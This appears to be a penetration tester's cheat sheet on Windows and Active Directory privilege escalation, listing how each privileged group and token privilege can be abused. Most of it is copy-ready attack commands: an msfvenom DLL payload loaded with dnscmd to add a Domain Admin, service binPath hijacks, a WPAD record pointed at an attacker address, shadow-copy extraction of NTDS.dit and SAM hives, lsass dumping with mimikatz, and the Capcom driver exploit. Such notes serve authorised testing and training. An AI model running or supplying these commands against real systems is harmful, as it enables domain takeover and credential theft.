* List user privileges: `whoami /priv`
* List user groups memberships: `whoami /groups`  
* Enabling disabled privileges: 
	* https://github.com/proxb/PoshPrivilege/blob/master/PoshPrivilege/Scripts/Enable-Privilege.ps1
	* https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
* Groups:
	* Default Administrators: Domain Admins and Enterprise Admins are "super" groups.
	* Backup Operators: Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.
		* Abuse: 
		* This group permits logging in locally to a domain controller.
		* User of this group get `SeBackup` and `SeRestore` privileges. Refer to their abuse.
	* Event Log Readers: Members of this group can read event logs from local computers. The group is created when the server is promoted to a domain controller. Default User Rights: None
		* Abuse: Can read windows event logs using [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility and the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) PowerShell cmdlet.
		* Password hunting with wevtutil:
			* `wevtutil qe Security /rd:true /f:text | Select-String "/user"`
			* `wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"`
			* `Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`
	* Server Operators: Members can modify services, access SMB shares, and backup files.
		* Abuse:
		* Can login locally to servers, including Domain Controllers.
		* Can control local services.
			* Use PsService to find services that can modified by the user with permissions such as SERVICE_ALL_ACCESS: `c:\Tools\PsService.exe security AppReadiness`  
			* Add user to admin by modifying binPath of service: `sc[.exe] config <service> binPath= "cmd /c net localgroup Administrators <service> /add"`
			* Restart service: `sc[.exe] start <service>`
		* Also refer to abuse of `SeBackupPrivilege` and `SeRestorePrivilege`
	* Print Operators: Members can log on to DCs locally and "trick" Windows into loading a malicious driver.
		* Abuse: This group gets SeLoadDriverPrivilege privilege. Refer to its abuse.
			* If privilege is not present then UAC bypass might be required or GUI access with credentials for UAC might be required.
	* Hyper-V Administrators: If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.
		* Abuse: 
		* If domain controller is virtualized, then create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.
		* Can also use hardlink abuse with https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/ if target is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841). 
			* GitHub exploit:  https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1
		* Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.
	* Account Operators: Members can modify non-protected accounts and groups in the domain.
	* Remote Desktop Users: Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.
	* Remote Management Users: Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).
	* Group Policy Creator Owners: Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.
	* Schema Admins: Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.
	* DNS Admins: Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.
		* Abuse: 
		* dnsadmin ServerLevelPluginDll abuse:
			* `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`
			* `dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`
			* `sc stop dns`
			* `sc start dns`
		* Creating a WPAD Record:
			* `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`
			* `Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`
	* https://ss64.com/nt/syntax-security_groups.html
* Privileges: 
	* SeImpersonatePrivilege: Impersonate a client after authentication.
		* Abuse token by impersonating SYSTEM account using [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) or [RoguePotato](https://github.com/antonioCoco/RoguePotato)([Potato family](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) for more potato alternatives).
		* Reference: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
	* SeBackupPrivilege: Back up files and directories.
		* Abuse: 
		* Enable the privilege:
			* https://github.com/giuliano108/SeBackupPrivilege
			* `Import-Module .\SeBackupPrivilegeUtils.dll`
			* `Import-Module .\SeBackupPrivilegeCmdLets.dll`
		* `Set-SeBackupPrivilege;Get-SeBackupPrivilege`
		* Copying a Protected File:
			* `Copy-FileSeBackupPrivilege '<source path>' '<destination path>'`
		* Attacking a Domain Controller - Copying NTDS.dit:
			* diskshadow.exe:
				```powershell
				DISKSHADOW> set verbose on
				DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
				DISKSHADOW> set context clientaccessible
				DISKSHADOW> set context persistent
				DISKSHADOW> begin backup
				DISKSHADOW> add volume C: alias cdrive
				DISKSHADOW> create
				DISKSHADOW> expose %cdrive% E:
				DISKSHADOW> end backup
				DISKSHADOW> exit
					```
			  * `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`
		  * Backing up SAM and SYSTEM Registry Hives:
			  * `reg save HKLM\SYSTEM SYSTEM.SAV`
			  * `reg save HKLM\SAM SAM.SAV`
			  * Extracting Credentials from NTDS.dit: `secretsdump.py` or the PowerShell `DSInternals` 
		  * Copying Files with Robocopy:
			  * `robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
	* SeTakeOwnershipPrivilege: Take ownership of files or other objects.
		* Abuse:
		* Enumerate a file's owner: `Get-ChildItem -Path '<path>' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}`
		* Take ownership of file: `takeown /f '<file>'`
		* Modify file for full control: `icacls '<file>' /grant <user>:F`
		* Files of interest to take over: 
			* `c:\inetpub\wwwwroot\web.config`, `%WINDIR%\repair\sam`, `%WINDIR%\repair\system`, `%WINDIR%\repair\software`, `%WINDIR%\repair\security`, `%WINDIR%\system32\config\SecEvent.Evt`, `%WINDIR%\system32\config\default.sav`, `%WINDIR%\system32\config\security.sav`, `%WINDIR%\system32\config\software.sav`, `%WINDIR%\system32\config\system.sav`
	* SeDebugPrivilege: Debug programs.
		* Abuse token by dumping memory with application such as lsass.
		* Dump memory with `procdump.exe -accepteula -ma lsass.exe lsass.dmp` or from Task manager -> Details -> Lsass -> Create dump file.
		* Load into mimikatz and get credentials `sekurlsa::minidump lsass.dmp` then `sekurlsa::logonpasswords`
		* RCE: Import script from https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1 and execute `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)`. Get System process PID from `tasklist`.
	* SeSecurityPrivilege: Manage auditing and security log.
	* SeLoadDriverPrivilege: Load and unload device drivers.
		* Abuse:
			* Compile [EnableSeLoadDriverPrivilege.cpp](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)
			* Download [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
			* Add registry key: `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`
			* Verify if driver loaded: `.\DriverView.exe /stext drivers.txt` then `cat drivers.txt | Select-String -pattern Capcom`
			* Exploit for a SYSTEM shell: `.\ExploitCapcom.exe`
			* Automated version of exploit: `EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`
	* SeRestorePrivilege: Restore files and directories.
	* SeNetworkLogonRight: Access this computer from the network.
	* SeRemoteInteractiveLogonRight: Allow log on through Remote Desktop Services.
	* Token abuse Reference: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
	* Repo with Privileges PoCs: https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations